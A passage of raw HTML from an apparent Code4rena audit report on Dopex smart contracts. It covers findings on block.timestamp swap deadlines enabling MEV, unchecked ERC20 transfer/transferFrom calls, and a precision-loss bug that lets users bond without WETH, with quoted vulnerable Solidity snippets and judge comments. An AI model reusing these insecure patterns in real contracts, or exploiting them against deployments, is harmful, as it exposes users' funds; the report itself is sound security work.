href=\"https://github.com/code-423n4/2023-08-dopex/blob/0ea4387a4851cd6c8811dfb61da95a677f3f63ae/contracts/amo/UniV2LiquidityAmo.sol#L134-L134\">134</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"85\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">amo</span><span class=\"mtk1\">/</span><span class=\"mtk12\">UniV3LiquidityAmo</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">150</span><span class=\"mtk1\">:       </span><span class=\"mtk11\">IERC20WithBurn</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_token</span><span class=\"mtk1\">).</span><span class=\"mtk11\">approve</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_target</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_amount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">169</span><span class=\"mtk1\">      </span><span class=\"mtk11\">IERC20WithBurn</span><span class=\"mtk1\">(</span><span class=\"mtk12\">params</span><span class=\"mtk1\">.</span><span class=\"mtk12\">_tokenA</span><span class=\"mtk1\">).</span><span class=\"mtk11\">approve</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">170</span><span class=\"mtk1\">        </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">univ3_positions</span><span class=\"mtk1\">),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">171</span><span class=\"mtk1\">        </span><span class=\"mtk12\">params</span><span class=\"mtk1\">.</span><span class=\"mtk12\">_amount0Desired</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">172</span><span class=\"mtk1\">:     );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">173</span><span class=\"mtk1\">      </span><span class=\"mtk11\">IERC20WithBurn</span><span class=\"mtk1\">(</span><span class=\"mtk12\">params</span><span class=\"mtk1\">.</span><span class=\"mtk12\">_tokenB</span><span class=\"mtk1\">).</span><span class=\"mtk11\">approve</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">174</span><span class=\"mtk1\">        </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">univ3_positions</span><span class=\"mtk1\">),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">175</span><span class=\"mtk1\">        </span><span class=\"mtk12\">params</span><span class=\"mtk1\">.</span><span class=\"mtk12\">_amount1Desired</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">176</span><span class=\"mtk1\">:     );</span></span></span></code></pre>\n<p><em>GitHub</em>: <a href=\"https://github.com/code-423n4/2023-08-dopex/blob/0ea4387a4851cd6c8811dfb61da95a677f3f63ae/contracts/amo/UniV3LiquidityAmo.sol#L150-L150\">150</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex/blob/0ea4387a4851cd6c8811dfb61da95a677f3f63ae/contracts/amo/UniV3LiquidityAmo.sol#L169-L172\">169</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex/blob/0ea4387a4851cd6c8811dfb61da95a677f3f63ae/contracts/amo/UniV3LiquidityAmo.sol#L173-L176\">173</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"86\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">core</span><span class=\"mtk1\">/</span><span class=\"mtk12\">RdpxV2Core</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">411</span><span class=\"mtk1\">:     </span><span class=\"mtk11\">IERC20WithBurn</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_token</span><span class=\"mtk1\">).</span><span class=\"mtk11\">approve</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_spender</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_amount</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p><em>GitHub</em>: <a href=\"https://github.com/code-423n4/2023-08-dopex/blob/0ea4387a4851cd6c8811dfb61da95a677f3f63ae/contracts/core/RdpxV2Core.sol#L411-L411\">411</a></p>\n<p><strong><a href=\"https://gist.github.com/code423n4/3c6507b76ca940e11c287862cb4a1fd3?permalink_comment_id=4779111#gistcomment-4779111\">psytama (Dopex) disputed</a></strong></p>\n<p><strong><a href=\"https://gist.github.com/code423n4/3c6507b76ca940e11c287862cb4a1fd3?permalink_comment_id=4779121#gistcomment-4779121\">Alex the Entreprenerd (Judge) commented</a></strong></p>\n<blockquote>\n<p>This can be argued to be medium although in most circumnstances the tx would revert later.</p>\n</blockquote>\n<hr>\n<h2 id=\"m-19-using-blocktimestamp-as-the-deadlineexpiry-invites-mev\" style=\"position:relative;\"><a href=\"#m-19-using-blocktimestamp-as-the-deadlineexpiry-invites-mev\" aria-label=\"m 19 using blocktimestamp as the deadlineexpiry invites mev permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[M-19] Using <code>block.timestamp</code> as the deadline/expiry invites MEV</h2>\n<p><em>Submitted by <a href=\"https://gist.github.com/code423n4/3c6507b76ca940e11c287862cb4a1fd3?permalink_comment_id=4779121#m02-using-blocktimestamp-as-the-deadlineexpiry-invites-mev\">IllIllI</a></em></p>\n<p><em>Note: this finding was reported via the winning <a href=\"https://gist.github.com/code423n4/3c6507b76ca940e11c287862cb4a1fd3\">Automated Findings report</a>. It was declared out of scope for the audit, but is being included here for completeness.</em></p>\n<p>Passing <code>block.timestamp</code> as the expiry/deadline of an operation does not mean “require immediate execution” - it means “whatever block this transaction appears in, I’m comfortable with that block’s timestamp”. Providing this value means that a malicious miner can hold the transaction for as long as they like (think the flashbots mempool for bundling transactions), which may be until they are able to cause the transaction to incur the maximum amount of slippage allowed by the slippage parameter, or until conditions become unfavorable enough that other orders, e.g. liquidations, are triggered. Timestamps should be chosen off-chain, and should be specified by the caller to avoid unnecessary MEV.</p>\n<p><em>There is one instance of this issue:</em></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"87\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">amo</span><span class=\"mtk1\">/</span><span class=\"mtk12\">UniV2LiquidityAmo</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">337</span><span class=\"mtk1\">        .</span><span class=\"mtk11\">swapExactTokensForTokens</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">338</span><span class=\"mtk1\">          </span><span class=\"mtk12\">token1Amount</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">339</span><span class=\"mtk1\">          </span><span class=\"mtk12\">token2AmountOutMin</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">340</span><span class=\"mtk1\">          </span><span class=\"mtk12\">path</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">341</span><span class=\"mtk1\">          </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">342</span><span class=\"mtk1\">          </span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\"> + </span><span class=\"mtk7\">1</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">343</span><span class=\"mtk1\">        )[</span><span class=\"mtk12\">path</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\"> - </span><span class=\"mtk7\">1</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">344</span><span class=\"mtk1\">  </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">345</span><span class=\"mtk1\">:     </span><span class=\"mtk3\">// send tokens back to rdpxV2Core</span></span></span></code></pre>\n<p><em>GitHub</em>: <a href=\"https://github.com/code-423n4/2023-08-dopex/blob/0ea4387a4851cd6c8811dfb61da95a677f3f63ae/contracts/amo/UniV2LiquidityAmo.sol#L337-L345\">337</a></p>\n<p><strong><a href=\"https://gist.github.com/code423n4/3c6507b76ca940e11c287862cb4a1fd3?permalink_comment_id=4779111#gistcomment-4779111\">psytama (Dopex) confirmed</a></strong></p>\n<p><strong><a href=\"https://gist.github.com/code423n4/3c6507b76ca940e11c287862cb4a1fd3?permalink_comment_id=4779121#gistcomment-4779121\">Alex the Entreprenerd (Judge) commented</a></strong></p>\n<blockquote>\n<p>This I agree with the sponsor that could be considered Medium as it allows MEV to be extracted by delaying tx inclusion.</p>\n</blockquote>\n<hr>\n<h2 id=\"m-20-unsafe-use-of-transfertransferfrom-with-ierc20\" style=\"position:relative;\"><a href=\"#m-20-unsafe-use-of-transfertransferfrom-with-ierc20\" aria-label=\"m 20 unsafe use of transfertransferfrom with ierc20 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[M-20] Unsafe use of <code>transfer()</code>/<code>transferFrom()</code> with <code>IERC20</code></h2>\n<p><em>Submitted by <a href=\"https://gist.github.com/code423n4/3c6507b76ca940e11c287862cb4a1fd3?permalink_comment_id=4779121#m04-unsafe-use-of-transfertransferfrom-with-ierc20\">IllIllI</a></em></p>\n<p><em>Note: this finding was reported via the winning <a href=\"https://gist.github.com/code423n4/3c6507b76ca940e11c287862cb4a1fd3\">Automated Findings report</a>. It was declared out of scope for the audit, but is being included here for completeness.</em></p>\n<p>Some tokens do not implement the ERC20 standard properly but are still accepted by most code that accepts ERC20 tokens.  For example Tether (USDT)‘s <code>transfer()</code> and <code>transferFrom()</code> functions on L1 do not return booleans as the specification requires, and instead have no return value. When these sorts of tokens are cast to <code>IERC20</code>, their <a href=\"https://medium.com/coinmonks/missing-return-value-bug-at-least-130-tokens-affected-d67bf08521ca\">function signatures</a> do not match and therefore the calls made, revert (see <a href=\"https://gist.github.com/IllIllI000/2b00a32e8f0559e8f386ea4f1800abc5\">this</a> link for a test case). Use OpenZeppelinundefineds <code>SafeERC20</code>’s <code>safeTransfer()</code>/<code>safeTransferFrom()</code> instead</p>\n<p><em>There are 6 instances of this issue:</em></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"88\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">amo</span><span class=\"mtk1\">/</span><span class=\"mtk12\">UniV3LiquidityAmo</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">158</span><span class=\"mtk1\">      </span><span class=\"mtk11\">IERC20WithBurn</span><span class=\"mtk1\">(</span><span class=\"mtk12\">params</span><span class=\"mtk1\">.</span><span class=\"mtk12\">_tokenA</span><span class=\"mtk1\">).</span><span class=\"mtk11\">transferFrom</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">159</span><span class=\"mtk1\">        </span><span class=\"mtk12\">rdpxV2Core</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">160</span><span class=\"mtk1\">        </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">161</span><span class=\"mtk1\">        </span><span class=\"mtk12\">params</span><span class=\"mtk1\">.</span><span class=\"mtk12\">_amount0Desired</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">162</span><span class=\"mtk1\">:     );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">163</span><span class=\"mtk1\">      </span><span class=\"mtk11\">IERC20WithBurn</span><span class=\"mtk1\">(</span><span class=\"mtk12\">params</span><span class=\"mtk1\">.</span><span class=\"mtk12\">_tokenB</span><span class=\"mtk1\">).</span><span class=\"mtk11\">transferFrom</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">164</span><span class=\"mtk1\">        </span><span class=\"mtk12\">rdpxV2Core</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">165</span><span class=\"mtk1\">        </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">166</span><span class=\"mtk1\">        </span><span class=\"mtk12\">params</span><span class=\"mtk1\">.</span><span class=\"mtk12\">_amount1Desired</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">167</span><span class=\"mtk1\">:     );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">283</span><span class=\"mtk1\">      </span><span class=\"mtk11\">IERC20WithBurn</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_tokenA</span><span class=\"mtk1\">).</span><span class=\"mtk11\">transferFrom</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">284</span><span class=\"mtk1\">        </span><span class=\"mtk12\">rdpxV2Core</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">285</span><span class=\"mtk1\">        </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">286</span><span class=\"mtk1\">        </span><span class=\"mtk12\">_amountAtoB</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">287</span><span class=\"mtk1\">:     );</span></span></span></code></pre>\n<p><em>GitHub</em>: <a href=\"https://github.com/code-423n4/2023-08-dopex/blob/0ea4387a4851cd6c8811dfb61da95a677f3f63ae/contracts/amo/UniV3LiquidityAmo.sol#L158-L162\">158</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex/blob/0ea4387a4851cd6c8811dfb61da95a677f3f63ae/contracts/amo/UniV3LiquidityAmo.sol#L163-L167\">163</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex/blob/0ea4387a4851cd6c8811dfb61da95a677f3f63ae/contracts/amo/UniV3LiquidityAmo.sol#L283-L287\">283</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"89\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">perp</span><span class=\"mtk1\">-</span><span class=\"mtk12\">vault</span><span class=\"mtk1\">/</span><span class=\"mtk12\">PerpetualAtlanticVaultLP</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">128</span><span class=\"mtk1\">:     </span><span class=\"mtk12\">collateral</span><span class=\"mtk1\">.</span><span class=\"mtk11\">transferFrom</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">), </span><span class=\"mtk12\">assets</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">170</span><span class=\"mtk1\">:     </span><span class=\"mtk12\">collateral</span><span class=\"mtk1\">.</span><span class=\"mtk11\">transfer</span><span class=\"mtk1\">(</span><span class=\"mtk12\">receiver</span><span class=\"mtk1\">, </span><span class=\"mtk12\">assets</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p><em>GitHub</em>: <a href=\"https://github.com/code-423n4/2023-08-dopex/blob/0ea4387a4851cd6c8811dfb61da95a677f3f63ae/contracts/perp-vault/PerpetualAtlanticVaultLP.sol#L128-L128\">128</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex/blob/0ea4387a4851cd6c8811dfb61da95a677f3f63ae/contracts/perp-vault/PerpetualAtlanticVaultLP.sol#L170-L170\">170</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"90\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">reLP</span><span class=\"mtk1\">/</span><span class=\"mtk12\">ReLPContract</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">243</span><span class=\"mtk1\">      </span><span class=\"mtk11\">IERC20WithBurn</span><span class=\"mtk1\">(</span><span class=\"mtk12\">addresses</span><span class=\"mtk1\">.</span><span class=\"mtk12\">pair</span><span class=\"mtk1\">).</span><span class=\"mtk11\">transferFrom</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">244</span><span class=\"mtk1\">        </span><span class=\"mtk12\">addresses</span><span class=\"mtk1\">.</span><span class=\"mtk12\">amo</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">245</span><span class=\"mtk1\">        </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">246</span><span class=\"mtk1\">        </span><span class=\"mtk12\">lpToRemove</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">247</span><span class=\"mtk1\">:     );</span></span></span></code></pre>\n<p><em>GitHub</em>: <a href=\"https://github.com/code-423n4/2023-08-dopex/blob/0ea4387a4851cd6c8811dfb61da95a677f3f63ae/contracts/reLP/ReLPContract.sol#L243-L247\">243</a></p>\n<p><strong><a href=\"https://gist.github.com/code423n4/3c6507b76ca940e11c287862cb4a1fd3?permalink_comment_id=4779111#gistcomment-4779111\">psytama (Dopex) disputed</a></strong></p>\n<p><strong><a href=\"https://gist.github.com/code423n4/3c6507b76ca940e11c287862cb4a1fd3?permalink_comment_id=4779121#gistcomment-4779121\">Alex the Entreprenerd (Judge) commented</a></strong></p>\n<blockquote>\n<p>I believe this should be Classified as Medium as a no-op here can break accounting, even though on Arbitrum this is lower likelihood.</p>\n</blockquote>\n<hr>\n<h1 id=\"low-risk-and-non-critical-issues\" style=\"position:relative;\"><a href=\"#low-risk-and-non-critical-issues\" aria-label=\"low risk and non critical issues permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Low Risk and Non-Critical Issues</h1>\n<p>For this audit, 52 reports were submitted by wardens detailing low risk and non-critical issues. The <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1033\">report highlighted below</a> by <strong>juancito</strong> received the top score from the judge.</p>\n<p><em>The following wardens also submitted reports: <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/2099\">Toshii</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/2049\">ladboy233</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1830\">Evo</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1589\">peakbolt</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1493\">glcanvas</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1454\">sces60107</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1304\">ubermensch</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1056\">carrotsmuggler</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/882\">said</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/809\">lsaudit</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/425\">T1MOH</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/147\">deadrxsezzz</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/2217\">KrisApostolov</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/2211\">0xkazim</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/2157\">josephdara</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/2145\">dethera</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/2132\">QiuhaoLi</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/2119\">savi0ur</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/2118\">Yanchuan</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/2061\">MohammedRizwan</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/2034\">codegpt</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1952\">Nikki</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1874\">0xTiwa</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1842\">parsely</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1839\">catellatech</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1836\">__141345__</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1668\">minhquanym</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1659\">ether_sky</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1622\">WoolCentaur</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1553\">Aymen0909</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1430\">pep7siup</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1269\">asui</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1246\">klau5</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1124\">jasonxiale</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/989\">Bauchibred</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/975\">bart1e</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/884\">kodyvim</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/871\">IceBear</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/840\">0xDING99YA</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/799\">ABA</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/788\">0xnev</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/655\">tapir</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/621\">gjaldon</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/593\">erebus</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/583\">dirk_y</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/574\">volodya</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/349\">zzebra83</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/263\">rvierdiiev</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/149\">ArmedGoose</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/137\">degensec</a>, and <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/58\">chaduke</a>.</em></p>\n<h2 id=\"l-01---users-can-bond-without-providing-weth\" style=\"position:relative;\"><a href=\"#l-01---users-can-bond-without-providing-weth\" aria-label=\"l 01   users can bond without providing weth permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[L-01] - Users can bond without providing WETH</h2>\n<p><code>RdpxV2Core::calculateBondCost()</code> does not account for precission loss and allows users to bond an amount of <code>1</code>, without providing any WETH.</p>\n<ul>\n<li><a href=\"https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/core/RdpxV2Core.sol#L904\">RdpxV2Core.sol#L904</a></li>\n<li><a href=\"https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/core/RdpxV2Core.sol#L705\">RdpxV2Core.sol#L705</a></li>\n</ul>\n<h3 id=\"impact-5\" 